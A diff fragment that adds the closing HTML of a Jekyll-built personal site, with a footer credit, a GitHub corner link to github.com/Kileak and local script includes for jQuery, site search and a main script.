+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
